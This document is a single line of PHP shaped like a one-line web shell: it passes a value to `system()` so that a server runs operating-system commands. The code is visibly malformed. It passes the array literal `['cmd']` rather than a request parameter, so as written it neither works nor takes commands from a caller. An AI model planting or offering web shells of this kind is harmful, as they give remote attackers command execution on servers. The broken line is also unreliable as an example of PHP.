<?php system(['cmd']); ?>
